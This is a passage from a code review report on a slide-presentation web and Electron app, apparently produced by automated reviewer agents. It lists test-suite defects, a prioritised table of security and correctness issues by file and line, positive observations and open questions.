Tests cover server-side only. No tests for downloadHTML, exportPDF, presentInWindow.

#### 17. Empty shared-pptx-utils.test.js
**File:** `shared/tests/shared-pptx-utils.test.js`
Exists but only imports, no test cases.

---

## ============================================================
## GROUP 7: E2E + UNIT TESTS
**Files:** 22 E2E specs, 4 page objects, 1 fixture, 2 load tests, ~40 unit tests

### CRITICAL

#### 1. Load tests hit wrong port (3000 instead of 3002)
**Files:** `tests/load/api-load.js:13`, `tests/load/websocket-load.js:11`
`BASE_URL = 'http://localhost:3000/api'` — Express runs on 3002. All requests hit wrong server.

#### 2. Tautological assertion — always passes
**File:** `tests/e2e/explore.spec.js:25`
`expect(hasEmpty || cardCount >= 0).toBeTruthy()` — `cardCount >= 0` always true.

#### 3. Share URL uses wrong origin (4173 vs 3002)
**File:** `tests/e2e/sharing.spec.js:60`
`getBaseUrl()` returns `http://127.0.0.1:4173` but share route lives on Express (3002). Share URL becomes `http://127.0.0.1:4173/share/${token}` → 404.

#### 4. Live room input checked against URL regex instead of text
**File:** `tests/e2e/live.spec.js:106`
`expect(readonlyInputs.nth(0)).toHaveValue(/\/live\//)` — inputValue() returns displayed text, not URL. Assertion likely fails.

#### 5. Dialog handler leak — accumulates across tests
**File:** `tests/e2e/pages/HomePage.js:72`
`page.on('dialog', ...)` added without removal. Every subsequent test inherits this handler.

#### 6. API fixture returns res.json() without res.ok() check
**File:** `tests/e2e/fixtures/test-fixtures.js`
404 response causes parse error instead of clear failure.

#### 7. Storage mutation without afterEach cleanup
**File:** `tests/e2e/api-surface.test.js`
`storage.writeSettings()`, `storage.writeGithubConfig()`, `storage.writePresentations()` called without cleanup. Tests pollute each other.

#### 8. page.goto() not awaited in openPresenter
**File:** `tests/e2e/live.spec.js:37`
Unbounded await. Test proceeds with broken page object if goto fails.

#### 9. Route handlers leak across test phases
**File:** `tests/e2e/editor.spec.js:78-128`
`page.route()` handlers defined without cleanup. Failed tests leave stale handlers.

#### 10. Socket.IO protocol hardcoded — version mismatch
**File:** `tests/load/websocket-load.js`
`socket.send('40')` and `socket.send('42["join-presentation", ...]')` hardcoded. Protocol versions differ in message format.

### HIGH

#### 11. Fragmentary undo/redo test
**File:** `tests/e2e/undo-redo.spec.js:56-63`
Only checks `.slide-canvas` visibility — doesn't verify state change. Broken undo/redo would still pass.

#### 12. Fragile Tailwind-class selectors
**File:** `tests/e2e/dashboard.spec.js:25`
`button.text-primary` breaks if theme/design changes.

#### 13. Race condition on insertItem
**File:** `tests/e2e/coverage-gaps.spec.js:48-52`
Slow network requests (SVG upload, audio) race against count check.

#### 14. AI test doesn't assert graceful failure
**File:** `tests/e2e/ai.spec.js:43-46`
Test waits for content but never verifies failure if mock is not hit.

#### 15. openPresenter swallows goto errors
**File:** `tests/e2e/live.spec.js:37`
`page.goto()` result not checked. Invalid URL proceeds silently.

#### 16. Shared let presId across tests — pollutes on beforeEach failure
**File:** `tests/e2e/live.spec.js:66`, `tests/e2e/sharing.spec.js:11`
If `beforeEach` fails, `presId` is undefined, `afterEach` deletes nothing → data leak.

#### 17. API surface test mutates global storage
**File:** `tests/e2e/api-surface.test.js`
Same as #7.

#### 18. PPTX harness test hits real file without guard
**File:** `tests/e2e/harness-integration.test.js:8`
`path.resolve(process.cwd(), 'PPTX', 'Bai_2_1.pptx')` — missing file → silent pass.

#### 19. No error response validation in API helpers
**File:** `tests/e2e/fixtures/test-fixtures.js`
Same as #6.

### MEDIUM (20 items)

#### 20. smoke.spec.js has no actual assertion
Only visibility check, no content verification.

#### 21. settings.spec.js existence-only test
"Test Connection" existence only, no connection flow test with mock.

#### 22. addSlideFromTemplate skipped with eslint-disable
**File:** `tests/e2e/slide-management.spec.js:55`

#### 23. addTable eslint-disable comment stale
**File:** `tests/e2e/elements.spec.js:37`
"Table doesn't use prompt anymore" but disable stays.

#### 24. ExplorePage.backBtn too generic
**File:** `tests/e2e/pages/ExplorePage.js:9`
`button.first()` could click wrong button.

#### 25. closeOverlayModal fragile selector
**File:** `tests/e2e/pages/EditorPage.js:102`
`.fixed.inset-0.last()` could match any overlay.

#### 26. Guide removal by double-click is implementation detail
**File:** `tests/e2e/coverage-gaps.spec.js:266`
Breaks if removal mechanism changes.

#### 27. Screenshot size 10_000 bytes fragile
**File:** `tests/e2e/coverage-gaps.spec.js:310-311`
Varies by font, OS, DPR.

#### 28. live-rooms.test.js relies on internal _resetRooms()
If method is removed/renamed, tests break silently.

#### 29. editor-store.test.js uses partial match
`toMatchObject` doesn't validate intermediate mutations.

#### 30. apiDeletePresentation swallows ALL errors
**File:** `tests/e2e/fixtures/test-fixtures.js`
500 errors mask real problems.

### COVERAGE GAPS — 20 Critical Flows Not Tested

1. Trash/restore via UI (only API tested)
2. Permanent delete via UI
3. Presentation duplication via UI (POM method exists but unused)
4. Restore from Trash via UI
5. Template marketplace — filter, load, fork not verified
6. GitHub push E2E (dialog only, no actual push)
7. Cloud sync E2E (modal only, no actual sync)
8. PPTX import E2E (browser upload flow)
9. PPT export browser download (API only)
10. Print/PDF export E2E
11. Analytics view count from viewer side
12. Share link revocation
13. AI slide generator full E2E
14. AI translate presentation full E2E
15. Undo/redo via toolbar buttons (keyboard only)
16. Animation timeline panel UI
17. Element alignment via toolbar UI
18. Responsive/mobile editor editing
19. Network failure during save
20. Clipboard copy/paste across slides

---

## ============================================================
## CONSOLIDATED MUST-FIX LIST

### PRIORITY 1 — Security (Critical, Week 1)

| # | Severity | Location | Issue |
|---|----------|----------|-------|
| 1 | CRITICAL | SlideCanvas.jsx:2653 | XSS — SVG via dangerouslySetInnerHTML |
| 2 | CRITICAL | SlideCanvas.jsx:2007 | XSS — Markdown HTML without sanitization |
| 3 | CRITICAL | SlidePanel.jsx:248 | XSS — text content via dangerouslySetInnerHTML |
| 4 | CRITICAL | SlideSorterView.jsx:263 | XSS — srcDoc iframe with allow-scripts |
| 5 | CRITICAL | TransitionPreview.jsx:30 | XSS — el.content in srcDoc HTML |
| 6 | CRITICAL | element-renderers.js:124,133,183,229,354 | Missing iframe sandbox attributes |
| 7 | CRITICAL | element-renderers.js:228 | LaTeX </script> injection in srcdoc |
| 8 | CRITICAL | server/index.js | Share token cascade delete broken |
| 9 | CRITICAL | server/index.js:239 | View counter race — read outside lock |
| 10 | CRITICAL | server/routes/analytics.js:45 | Analytics public, no auth |
| 11 | CRITICAL | server/services/live-rooms.js:33 | No presenter auth — room hijacking |
| 12 | CRITICAL | server/services/ai-provider.js:65 | SSRF in AI custom endpoint |
| 13 | CRITICAL | server/index.js:163 | CSS regex filter trivially bypassed |
| 14 | CRITICAL | use-history.js:26 | Race condition — undo 1 step behind |
| 15 | CRITICAL | use-live-presentation.js:14 | Socket room code stale closure |
| 16 | CRITICAL | use-reveal-preview-frame.js:27 | Interval memory leak |
| 17 | CRITICAL | use-clipboard.js:59 | setTimeout(50ms) fragile out-of-order |
| 18 | CRITICAL | tests/load/api-load.js:13 | Wrong port 3000 → 3002 |
| 19 | CRITICAL | tests/load/websocket-load.js:11 | Wrong port 3000 → 3002 |
| 20 | CRITICAL | tests/e2e/explore.spec.js:25 | Tautological assertion |
| 21 | CRITICAL | tests/e2e/sharing.spec.js:60 | Wrong origin 4173 → 3002 |
| 22 | CRITICAL | main.js:2,8 | Electron sandbox disabled globally |

### PRIORITY 2 — Correctness (High, Week 2)

| # | Severity | Location | Issue |
|---|----------|----------|-------|
| 23 | HIGH | EditorPage.jsx:1033, LiveViewPage.jsx:67 | Missing res.ok check |
| 24 | HIGH | EditorPage.jsx:743 | Stale presentation closure in handleRedo |
| 25 | HIGH | SettingsPage.jsx:98 | settings null throws in updateAI |
| 26 | HIGH | properties/*.jsx (7 files) | NaN propagation on empty input |
| 27 | HIGH | SlideThumbnail.jsx:28 | Unvalidated id prop in URL |
| 28 | HIGH | SlideThumbnail.jsx:10 | ResizeObserver memory leak |
| 29 | HIGH | DropdownMenu.jsx:43 | Missing null guard in items.map |
| 30 | HIGH | AnalyticsModal.jsx:16, SyncModal.jsx:22 | Silent catch(()=>{}) |
| 31 | HIGH | AnimationTimeline.jsx:35 | DOMParser per render |
| 32 | HIGH | export-pptx-raster.js:13 | Unbounded cache growth |
| 33 | HIGH | offlineExport.js:36 | fetchCache never cleared |
| 34 | HIGH | use-keyboard.js:127 | Unstable memo deps |
| 35 | HIGH | server/routes/ai.js:94 | AI JSON no schema validation |
| 36 | HIGH | server/routes/ai.js:56 | AI error messages exposed |
| 37 | HIGH | server/index.js:308 | Socket.IO CORS mismatch |
| 38 | HIGH | server/routes/analytics.js:25 | recordView writeFileLock missing |
| 39 | HIGH | server/routes/explore.js:29 | Trashed presentations in explore |

### PRIORITY 3 — Polish (Medium/Low, Week 3)

| # | Category | Location | Issue |
|---|---------|----------|-------|
| 40 | XSS | PropertiesPanel.jsx:226 | CSS injection in customCSS |
| 41 | XSS | htmlGenerator.js:170,464 | customCSS raw injection |
| 42 | XSS | element-renderers.js:110 | Client-side HTML no DOMPurify |
| 43 | Error | pdf-import.js:44 | Upload failures silently ignored |
| 44 | Error | import-project.js:88 | Media upload failures swallowed |
| 45 | Error | markdown-import.js:101 | Link URLs not validated |
| 46 | Performance | HomePage.jsx:1130 | marketplaceSearch not memoized |
| 47 | Performance | ColorPicker.jsx:31 | Canvas per parseColorToHex call |
| 48 | Performance | use-autosave.js:40 | Effect re-runs every keystroke |
| 49 | Dead | EditorPage.jsx:187,139,888 | showMasterPanel, saving, hasChanges |
| 50 | Dead | HomePage.jsx:208-211 | pdfInputRef, mdInputRef |
| 51 | Duplicate | 3 files | THEMES/TRANSITIONS duplicated |
| 52 | Duplicate | index.js vs toolbar-config | TEXT_COLORS/BG_COLORS differ |
| 53 | Accessibility | SelectionPane.jsx:77 | Emoji for lock status |
| 54 | Accessibility | SlideSorterView.jsx:190 | Missing aria-label |
| 55 | UX | HistoryModal.jsx:49 | window.confirm blocking |
| 56 | Test | 20 flows | Coverage gaps in critical paths |

---

## POSITIVE OBSERVATIONS

- Zustand immutability well-maintained (spreads, map/filter)
- Undo/redo ref pattern intentional and correct
- Electron IPC correctly designed (contextIsolation, no nodeIntegration)
- POM model well-structured for E2E
- Socket.IO cleanup on all live pages
- VITE_ prefix for env vars (no secrets in bundle)
- Lazy-loading of 764KB icon-paths.json
- safeStorage for Electron credential encryption
- KaTeX in reveal.js init uses text nodes (safe)
- ResizeObserver for thumbnail scaling
- DOMParser + text node walk in replaceInHtml
- Consistent isBackdropClick + useEscapeClose pattern
- forwardRef on all UI primitives
- Proper aria-modal/aria-labelledby on modals
- Error boundaries implemented
- Good test coverage on HTML generation paths

---

## UNRESOLVED QUESTIONS

1. Is DOMPurify already a dependency, or does it need to be added?
2. Is disabling Electron sandbox intentional for a specific feature?
3. Should a shared `sanitizePresentation` utility be created for consistent sanitization between server and client?
4. Does getBaseUrl() resolve correctly for both Vite dev (5173) and production (3002)?
5. Is the KaTeX iframe approach intended to be replaced by the data-math-latex span approach?
6. What is the expected format of the live room code input value — full URL path or 6-char code?
7. Is there a max file size limit for raster-elements API endpoint?
8. Does uploadFile validate file types?

---

**Total issues: 164+ | Critical: 29 | High: 38 | Medium: 65 | Low: 32 | Coverage gaps: 20**
**Report generated by: 7 parallel code-reviewer agents**
**Date: 2026-04-26**
